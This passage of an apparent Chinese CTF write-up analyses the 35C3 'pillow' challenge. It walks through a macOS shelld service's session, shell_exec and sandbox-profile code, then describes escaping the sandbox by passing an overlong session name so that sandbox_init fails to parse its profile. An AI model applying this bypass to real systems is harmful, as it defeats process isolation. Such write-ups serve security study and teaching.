+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">kern_return_t</span> <span class="title">unregister_completion_listener</span><span class="params">(<span class="keyword">mach_port_t</span> server, <span class="keyword">const</span> <span class="keyword">char</span>* session_name, <span class="keyword">audit_token_t</span> client)</span> </span>&#123;</span><br><span class="line">    CFMutableDictionaryRef session = lookup_session(session_name, client);</span><br><span class="line">    <span class="keyword">if</span> (!session)</span><br><span class="line">        <span class="keyword">return</span> KERN_FAILURE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> remove_listener(session);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">kern_return_t</span> <span class="title">remove_listener</span><span class="params">(CFMutableDictionaryRef session)</span> </span>&#123;</span><br><span class="line">    CFNumberRef value;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (CFDictionaryGetValueIfPresent(session, CFSTR(<span class="string">"listener"</span>), (<span class="keyword">const</span> <span class="keyword">void</span>**)&amp;value)) &#123;</span><br><span class="line">        <span class="keyword">mach_port_t</span> listener;</span><br><span class="line">        ASSERT(CFNumberGetValue(value, kCFNumberSInt32Type, &amp;listener));</span><br><span class="line">        mach_port_deallocate(mach_task_self(), listener);</span><br><span class="line">        CFDictionaryRemoveValue(session, CFSTR(<span class="string">"listener"</span>));</span><br><span class="line">        <span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> KERN_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h5 id="4-shelld-create-session-函数">4) shelld_create_session 函数</h5>
+<p>该函数主要是在全局字典 sessions 中创建一些结构体，具体的操作以注释的形式写入代码中：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">kern_return_t</span> <span class="title">shelld_create_session</span><span class="params">(<span class="keyword">mach_port_t</span> server, <span class="keyword">const</span> <span class="keyword">char</span>* session_name, <span class="keyword">audit_token_t</span> client)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 约束 session name 只能是字母或数字</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">char</span>* ptr = session_name; *ptr; ptr++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">isalnum</span>(*ptr)) &#123;</span><br><span class="line">            os_log(OS_LOG_DEFAULT, <span class="string">"shelld: denying invalid session name: %s"</span>, session_name);</span><br><span class="line">            <span class="keyword">return</span> KERN_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 不能重复创建相同名称的 session</span></span><br><span class="line">    CFStringRef key = CFStringCreateWithCString(kCFAllocatorDefault, session_name, kCFStringEncodingASCII);</span><br><span class="line">    <span class="keyword">if</span> (CFDictionaryContainsKey(sessions, key)) &#123;</span><br><span class="line">        os_log(OS_LOG_DEFAULT, <span class="string">"shelld: session already exists: %s"</span>, session_name);</span><br><span class="line">        CFRelease(key);</span><br><span class="line">        <span class="keyword">return</span> KERN_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 创建 session 字典，并将其添加进全局 sessions 中</span></span><br><span class="line">    CFMutableDictionaryRef session = CFDictionaryCreateMutable(kCFAllocatorDefault, <span class="number">0</span>, &amp;kCFTypeDictionaryKeyCallBacks, &amp;kCFTypeDictionaryValueCallBacks);</span><br><span class="line">    CFDictionaryAddValue(sessions, key, session);</span><br><span class="line">    <span class="comment">// 将 audit token 对应的 pid 放入 session 字典中</span></span><br><span class="line">    <span class="keyword">pid_t</span> pid = audit_token_to_pid(client);</span><br><span class="line"></span><br><span class="line">    CFNumberRef cf_pid = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &amp;pid);</span><br><span class="line">    CFDictionaryAddValue(session, CFSTR(<span class="string">"pid"</span>), cf_pid);</span><br><span class="line">    CFRelease(cf_pid);</span><br><span class="line">    <span class="comment">// 为当前创建的 session 新建一个文件夹</span></span><br><span class="line">    <span class="keyword">char</span> workdir[<span class="number">1024</span>];</span><br><span class="line">    <span class="built_in">snprintf</span>(workdir, <span class="keyword">sizeof</span>(workdir), <span class="string">"/private/tmp/shelld/%s"</span>, session_name);</span><br><span class="line">    mkdir(workdir, <span class="number">0777</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Note: this is racy: the client could exit and spawn a priviliged process into its PID before the server</span></span><br><span class="line">    <span class="comment">// gets here... Not too easy to exploit though from inside the sandbox so should be fine for a CTF :)</span></span><br><span class="line">    <span class="comment">// 设置传入pid所对应进程结束时的清除操作</span></span><br><span class="line">    <span class="keyword">dispatch_source_t</span> source = dispatch_source_create(DISPATCH_SOURCE_TYPE_PROC, pid, DISPATCH_PROC_EXIT, dispatch_get_main_queue());</span><br><span class="line">    dispatch_source_set_event_handler(source, ^&#123;</span><br><span class="line">        os_log(OS_LOG_DEFAULT, <span class="string">"shelld: cleaning up session for dead client %d"</span>, pid);</span><br><span class="line"></span><br><span class="line">        remove_listener(session);</span><br><span class="line">        CFDictionaryRemoveValue(sessions, key);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// TODO unlink directory here as well</span></span><br><span class="line"></span><br><span class="line">        CFRelease(session);</span><br><span class="line">        CFRelease(key);</span><br><span class="line"></span><br><span class="line">        dispatch_source_cancel(source);</span><br><span class="line">        dispatch_release(source);</span><br><span class="line">    &#125;);</span><br><span class="line">    dispatch_resume(source);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h5 id="5-shell-exec-函数">5) shell_exec 函数</h5>
+<p>接下来的这个函数可谓是重头戏，需要好好说明一下。</p>
+<ol>
+<li>
+<p>初始时，shelld 会判断传入的 command 是否为空。这里的 command 将被接下来所创建的子进程所使用，使用效果为 <code>system(command)</code>，因此 command 不能为空。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!command || <span class="built_in">strlen</span>(command) == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> KERN_FAILURE;</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>接下来，判断信息发送者是否有权限执行 <code>/bin/bash</code>，因为子进程会调用 /bin/bash。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 判断传入的 creds 是否有权限执行 /bin/bash</span></span><br><span class="line"><span class="keyword">if</span> (sandbox_check_with_capabilities(creds, <span class="string">"process-exec*"</span>, SANDBOX_CHECK_NO_REPORT, <span class="string">"/bin/bash"</span>)) &#123;</span><br><span class="line">    os_log(OS_LOG_DEFAULT, <span class="string">"shelld: denying request to sandboxed client %d\n"</span>, audit_token_to_pid(creds));</span><br><span class="line">    <span class="keyword">return</span> KERN_FAILURE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其中的 <code>sandbox_check_with_capabilities</code> 函数的操作如下：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sandbox_check_with_capabilities</span><span class="params">(<span class="keyword">audit_token_t</span> creds, <span class="keyword">const</span> <span class="keyword">char</span>* operation, <span class="keyword">int</span> flags, <span class="keyword">const</span> <span class="keyword">char</span>* arg)</span> </span>&#123;</span><br><span class="line">     <span class="comment">// 如果发送方本来就可以执行这个操作</span></span><br><span class="line">     <span class="keyword">int</span> result = sandbox_check_by_audit_token(creds, operation, flags, arg);</span><br><span class="line">     <span class="keyword">if</span> (result != <span class="number">1</span>) &#123;</span><br><span class="line">         <span class="comment">// 则直接返回0 ，表示允许执行</span></span><br><span class="line">         <span class="keyword">return</span> result;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="comment">// 如果发送方不支持执行这个操作，则向 capsd 询问发送方之前是否请求了这个权限</span></span><br><span class="line">     <span class="keyword">int</span> client_has_capability = <span class="number">0</span>;</span><br><span class="line">     <span class="keyword">pid_t</span> pid = audit_token_to_pid(creds);</span><br><span class="line">     has_capability(capsd_service_port, pid, operation, arg, &amp;client_has_capability);</span><br><span class="line">     <span class="comment">// 如果 capsd 中的权限存在，即 client_has_capability ，则整个函数返回0，表示允许执行操作</span></span><br><span class="line">     <span class="keyword">return</span> !client_has_capability;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>之后，获取传入 session name 和 creds 所对应的 session，并创建一对管道。这对管道将用于重定向子进程的 stdout</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取当前 creds 所对应的 session</span></span><br><span class="line">CFMutableDictionaryRef session = lookup_session(session_name, creds);</span><br><span class="line"><span class="keyword">if</span> (!session)</span><br><span class="line">    <span class="keyword">return</span> KERN_FAILURE;</span><br><span class="line"><span class="comment">// 创建一堆 rw pipe，这对 pipe 将用于重定向子进程的 stdout</span></span><br><span class="line"><span class="keyword">int</span> fds[<span class="number">2</span>];</span><br><span class="line">ASSERT(pipe(fds) == <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>接下来便是创建子进程，我们看看子进程做了什么工作：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建新进程</span></span><br><span class="line"><span class="keyword">int</span> pid = fork();</span><br><span class="line"><span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// 在子进程中</span></span><br><span class="line">    <span class="keyword">char</span>* argv[] = &#123;<span class="string">"/bin/bash"</span>, <span class="string">"-c"</span>, (<span class="keyword">char</span>*)command, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span>* envp[] = &#123;<span class="string">"PATH=/bin:/usr/bin:/usr/sbin"</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    <span class="comment">// 切换子进程的工作目录为先前创建的 session 文件夹</span></span><br><span class="line">    <span class="keyword">char</span> cwd[<span class="number">1024</span>];</span><br><span class="line">    <span class="built_in">snprintf</span>(cwd, <span class="keyword">sizeof</span>(cwd), <span class="string">"/private/tmp/shelld/%s"</span>, session_name);</span><br><span class="line">    chdir(cwd);</span><br><span class="line">    <span class="comment">// 主动进入沙箱</span></span><br><span class="line">    <span class="keyword">char</span> profile[<span class="number">4096</span>];</span><br><span class="line">    <span class="built_in">snprintf</span>(profile, <span class="keyword">sizeof</span>(profile), sb_profile_template, session_name);</span><br><span class="line">    sandbox_init(profile, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">// 重定向 stdout</span></span><br><span class="line">    dup2(fds[<span class="number">1</span>], STDOUT_FILENO);</span><br><span class="line">    close(STDERR_FILENO);</span><br><span class="line">    close(STDIN_FILENO);</span><br><span class="line"></span><br><span class="line">    close(fds[<span class="number">0</span>]);</span><br><span class="line">    close(fds[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">// 执行 bash</span></span><br><span class="line">    execve(<span class="string">"/bin/bash"</span>, argv, envp);</span><br><span class="line">    _exit(<span class="number">-1</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> KERN_FAILURE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到，子进程先是<strong>切换了自己当前的工作目录</strong>，之后<strong>主动进入沙箱</strong>、<strong>重定向 stdout</strong>，并最终执行 bash 程序。</p>
+<p>调用 <code>sandbox_init</code> 进入沙箱时，需要指定沙箱规则，我们看看子进程的沙箱规则模板是什么样的：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* sb_profile_template =   <span class="string">"(version 1)\n"</span></span><br><span class="line">                                    <span class="string">"(deny default)\n"</span></span><br><span class="line">                                    <span class="string">"(import \"system.sb\")\n"</span></span><br><span class="line">                                    <span class="string">"(allow process-fork)\n"</span></span><br><span class="line">                                    <span class="string">"(allow file-read* file-write* (subpath \"/private/tmp/shelld/%s\"))\n"</span></span><br><span class="line">                                    <span class="string">"(allow file-read-data file-write-data (subpath \"/dev/tty\"))\n"</span></span><br><span class="line">                                    <span class="string">"(allow file-read* process-exec (subpath \"/bin/\"))\n"</span></span><br><span class="line">                                    <span class="string">"(allow file-read* process-exec (subpath \"/usr/bin/\"))\n"</span></span><br><span class="line">                                    <span class="string">"(allow file-read* process-exec (subpath \"/usr/sbin/\"))\n"</span>;</span><br></pre></td></tr></table></figure>
+<p>这里配置了一些权限：</p>
+<ul>
+<li>
+<p>使用白名单设置</p>
+</li>
+<li>
+<p>导入 <code>/System/Library/Sandbox/Profiles/system.sb</code> 中的系统权限，这之中允许了 诸如读取 /dev/null、/dev/zero 文件等常用权限。</p>
+</li>
+<li>
+<p>允许 fork</p>
+</li>
+<li>
+<p>允许对该 session 工作路径下<strong>一切文件</strong>的<strong>任意信息</strong>的<strong>读写操作</strong></p>
+<blockquote>
+<p>这里的<strong>任意信息</strong>包括但不限于：文件数据、文件<strong>元</strong>数据、文件扩展属性等等。</p>
+<p>即一个文件里所有能读的东西。</p>
+</blockquote>
+</li>
+<li>
+<p>允许对 /dev/tty 路径下任意文件的<strong>数据</strong>读取和写入操作</p>
+</li>
+<li>
+<p>允许对 /bin、/usr/bin、/usr/sbin 文件夹下<strong>任意文件</strong>的<strong>读取与执行</strong></p>
+</li>
+</ul>
+</li>
+<li>
+<p>回到父进程，接下来父进程注册<strong>子进程退出时的事件处理例程</strong></p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> rfd = fds[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">__block <span class="keyword">int</span> running = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注册进程退出时的清除事件</span></span><br><span class="line">os_log(OS_LOG_DEFAULT, <span class="string">"shelld: bash spawned: %d\n"</span>, pid);</span><br><span class="line"><span class="keyword">dispatch_source_t</span> source = dispatch_source_create(DISPATCH_SOURCE_TYPE_PROC, pid, DISPATCH_PROC_EXIT, dispatch_get_main_queue());</span><br><span class="line">dispatch_source_set_event_handler(source, ^&#123;</span><br><span class="line">    running = <span class="literal">false</span>;</span><br><span class="line">    handle_process_exited(pid, session, rfd);</span><br><span class="line">    dispatch_source_cancel(source);</span><br><span class="line">    dispatch_release(source);</span><br><span class="line">&#125;);</span><br><span class="line">dispatch_resume(source);</span><br></pre></td></tr></table></figure>
+<p>注意到处理例程内部调用的 <strong>handle_process_exited</strong> 函数：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">handle_process_exited</span><span class="params">(<span class="keyword">pid_t</span> pid, CFMutableDictionaryRef session, <span class="keyword">int</span> output_fileno)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    waitpid(pid, &amp;status, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    os_log(OS_LOG_DEFAULT, <span class="string">"shelld: child %d exited with status %d"</span>, pid, status);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> output[<span class="number">4096</span>];</span><br><span class="line">    <span class="keyword">size_t</span> nread = read(output_fileno, output, <span class="keyword">sizeof</span>(output) - <span class="number">1</span>);</span><br><span class="line">    output[nread] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    CFNumberRef value;</span><br><span class="line">    <span class="keyword">if</span> (CFDictionaryGetValueIfPresent(session, CFSTR(<span class="string">"listener"</span>), (<span class="keyword">const</span> <span class="keyword">void</span>**)&amp;value)) &#123;</span><br><span class="line">        <span class="keyword">mach_port_t</span> listener;</span><br><span class="line">        ASSERT(CFNumberGetValue(value, kCFNumberSInt32Type, &amp;listener));</span><br><span class="line">        shelld_client_notify(listener, status, output);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close(output_fileno);</span><br><span class="line">    CFRelease(session);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>该函数会将子进程的 stdout 全部输出信息，读取 4096字节并将其发送给 listener port，即 client。</p>
+</li>
+<li>
+<p>最后父进程注册子进程的超时处理例程，<strong>每个子进程最多运行 60s</strong>，若执行超时则会被立即 kill。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置子进程超时时间为 60s</span></span><br><span class="line">dispatch_after(dispatch_time(DISPATCH_TIME_NOW, <span class="number">60</span> * NSEC_PER_SEC), dispatch_get_main_queue(), ^&#123;</span><br><span class="line">    <span class="keyword">if</span> (!running)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    os_log(OS_LOG_DEFAULT, <span class="string">"shelld: killing process %d due to timeout"</span>, pid);</span><br><span class="line">    kill(pid, SIGKILL);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h4 id="d-client-c">d. client.c</h4>
+<p>示例代码 client 中所做的事情不多，具体说明内嵌进代码中。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">kern_return_t</span> <span class="title">shelld_client_notify</span><span class="params">(<span class="keyword">mach_port_t</span> listener, <span class="keyword">int</span> status, <span class="keyword">const</span> <span class="keyword">char</span>* output)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Command finished with status %d and output: %s\n"</span>, status, output);</span><br><span class="line">    <span class="keyword">return</span> KERN_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"PID: %d\n"</span>, getpid());</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Press enter to continue..."</span>);</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取 shelld 的mach port</span></span><br><span class="line">    <span class="keyword">mach_port_t</span> bp, sp;</span><br><span class="line">    task_get_special_port(mach_task_self(), TASK_BOOTSTRAP_PORT, &amp;bp);</span><br><span class="line">    <span class="keyword">kern_return_t</span> kr = bootstrap_look_up(bp, <span class="string">"net.saelo.shelld"</span>, &amp;sp);</span><br><span class="line">    ASSERT_SUCCESS(kr, <span class="string">"bootstrap_look_up"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建一对收发信息的 listener 和 listener_send_right</span></span><br><span class="line">    <span class="keyword">mach_port_t</span> listener, listener_send_right;</span><br><span class="line">    <span class="keyword">mach_msg_type_name_t</span> aquired_right;</span><br><span class="line">    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amp;listener);</span><br><span class="line">    mach_port_extract_right(mach_task_self(), listener, MACH_MSG_TYPE_MAKE_SEND, &amp;listener_send_right, &amp;aquired_right);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在 shelld 中创建一个 session</span></span><br><span class="line">    <span class="keyword">if</span> (shelld_create_session(sp, <span class="string">"foo"</span>) != KERN_SUCCESS) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Failed to create session"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 将 listener_send_right 注册进 session 中的 listener</span></span><br><span class="line">    register_completion_listener(sp, <span class="string">"foo"</span>, listener_send_right);</span><br><span class="line">    mach_port_deallocate(mach_task_self(), listener_send_right);</span><br><span class="line">        </span><br><span class="line">    <span class="comment">// 设置自动处理 server 端调用的 notify 接口</span></span><br><span class="line">    <span class="keyword">dispatch_source_t</span> source = dispatch_source_create(DISPATCH_SOURCE_TYPE_MACH_RECV, listener, <span class="number">0</span>, dispatch_get_main_queue());</span><br><span class="line">    dispatch_source_set_event_handler(source, ^&#123;</span><br><span class="line">        dispatch_mig_server(source, MAX_MSG_SIZE, shelld_client_server);</span><br><span class="line">    &#125;);</span><br><span class="line">    dispatch_activate(source);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// client 连续三次向 shelld 请求执行程序</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, shell_exec(sp, <span class="string">"foo"</span>, <span class="string">"echo Hello World &gt; bar"</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, shell_exec(sp, <span class="string">"foo"</span>, <span class="string">"cat bar"</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, shell_exec(sp, <span class="string">"foo"</span>, <span class="string">"cat bar"</span>));</span><br><span class="line"></span><br><span class="line">    dispatch_main();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>运行结果：</p>
+<p><img src="/2022/01/35c3ctf_pillow/image-20220108135403282.png" alt="image-20220108135403282"></p>
+<h4 id="e-功能">e. 功能</h4>
+<p>通过阅读上面的代码，我们可以了解到，shelld 会根据信息发送方的<strong>权限</strong>与<strong>请求</strong>，动态创建一个<strong>带有沙箱</strong>的子进程。这里的权限指的是 <code>capsd</code> 中存储的 capabilities。</p>
+<h2 id="四、漏洞点">四、漏洞点</h2>
+<p>当前的 exploit 位于沙箱中，因此无法直接读取外部的 flag。我们只能通过题目提供的两个服务来尝试进行沙箱逃逸，通过观察我们可以发现，shelld 中有个 shell_exec 函数可以执行一个新的程序，或许可以尝试让 shelld 启动一个子进程来读取  flag。但这里存在一些条件：</p>
+<ol>
+<li>shell_exec 中会先<strong>判断权限（即 capabilities）</strong>，没有 <code>&quot;process-exec* &quot;/bin/bash&quot;</code> 沙箱权限的请求者将无法让 shelld 启动新进程。很明显 Exploit 位于沙箱之中，沙箱规则没有提供这个权限，无法直接通过这个 check。</li>
+<li>即便绕过了先前的权限判断，但 shell_exec 启动的<strong>子进程</strong>还会执行 <code>sandbox_init</code> 函数<strong>进入沙箱</strong>。一旦子进程进入沙箱，则子进程将无权读取 flag。</li>
+</ol>
+<p>我们先从简单的入手。</p>
+<h3 id="1-sandbox-init-沙箱函数绕过">1. sandbox_init 沙箱函数绕过</h3>
+<p>shell_exec 启动的子进程会执行 <code>sandbox_init</code> 函数，倘若该函数执行成功，那么子进程就无法读取到 flag。</p>
+<p>那么，如何让 sandbox_init 函数执行失败呢？注意 sb_profile_template 字符串：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* sb_profile_template =   <span class="string">"(version 1)\n"</span></span><br><span class="line">                                    <span class="string">"(deny default)\n"</span></span><br><span class="line">                                    <span class="string">"(import \"system.sb\")\n"</span></span><br><span class="line">                                    <span class="string">"(allow process-fork)\n"</span></span><br><span class="line">                                    <span class="string">"(allow file-read* file-write* (subpath \"/private/tmp/shelld/%s\"))\n"</span></span><br><span class="line">                                    <span class="string">"(allow file-read-data file-write-data (subpath \"/dev/tty\"))\n"</span></span><br><span class="line">                                    <span class="string">"(allow file-read* process-exec (subpath \"/bin/\"))\n"</span></span><br><span class="line">                                    <span class="string">"(allow file-read* process-exec (subpath \"/usr/bin/\"))\n"</span></span><br><span class="line">                                    <span class="string">"(allow file-read* process-exec (subpath \"/usr/sbin/\"))\n"</span>;</span><br></pre></td></tr></table></figure>
+<p>根据我的测试，scheme in AppSandboxProfile 的<strong>字符串长度不得超过 1023 字节</strong>。如果超过则 scheme profile 将解析出错，<code>sandbox_init</code> 函数直接返回，<strong>不会进入沙箱</strong>。</p>
+<p>以下是测试结果：</p>
+<p><img src="/2022/01/35c3ctf_pillow/image-20220108161115411.png" alt="image-20220108161115411"></p>
+<p>因此，我们可以通过<strong>传入超长 session name</strong> 来绕过子进程的 sandbox 初始化操作，就像下面这个 client：</p>
